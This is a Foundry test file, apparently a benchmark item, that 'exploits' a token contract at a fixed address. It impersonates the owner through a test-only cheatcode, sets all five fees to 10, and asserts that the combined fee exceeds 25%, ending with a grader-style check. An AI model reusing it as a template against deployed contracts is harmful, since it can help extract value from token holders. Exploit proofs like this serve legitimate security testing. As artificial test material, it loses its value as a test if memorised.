pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Token {
    function owner() external view returns (address);
    function setAllFeePercent(uint8 taxFee, uint8 liquidityFee, uint8 burnFee, uint8 walletFee, uint8 buybackFee) external;
    function _taxFee() external view returns (uint8);
    function _liquidityFee() external view returns (uint8);
    function _burnFee() external view returns (uint8);
    function _walletFee() external view returns (uint8);
    function _buybackFee() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x222f737285D0B60d8D4f27fA22cE8884c9F119F8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, we need to find the current owner
        address owner = Token(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Set all fees to their maximum values (10 each)
        Token(TARGET).setAllFeePercent(10, 10, 10, 10, 10);

        vm.stopPrank();

        // Read back the fee values
        uint8 taxFee = Token(TARGET)._taxFee();
        uint8 liquidityFee = Token(TARGET)._liquidityFee();
        uint8 burnFee = Token(TARGET)._burnFee();
        uint8 walletFee = Token(TARGET)._walletFee();
        uint8 buybackFee = Token(TARGET)._buybackFee();

        // Calculate the total fee percentage
        uint256 totalFee = uint256(taxFee) + liquidityFee + burnFee + walletFee + buybackFee;

        // Verify the exploit worked - total fee should be > 25
        assertGt(totalFee, 25, "Total fee should exceed 25%");

        // Also verify each fee is at its maximum
        assertEq(taxFee, 10, "Tax fee should be 10");
        assertEq(liquidityFee, 10, "Liquidity fee should be 10");
        assertEq(burnFee, 10, "Burn fee should be 10");
        assertEq(walletFee, 10, "Wallet fee should be 10");
        assertEq(buybackFee, 10, "Buyback fee should be 10");
        assertGt(Token(0x222f737285D0B60d8D4f27fA22cE8884c9F119F8)._taxFee() + Token(0x222f737285D0B60d8D4f27fA22cE8884c9F119F8)._liquidityFee() + Token(0x222f737285D0B60d8D4f27fA22cE8884c9F119F8)._burnFee() + Token(0x222f737285D0B60d8D4f27fA22cE8884c9F119F8)._walletFee() + Token(0x222f737285D0B60d8D4f27fA22cE8884c9F119F8)._buybackFee(), 25, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

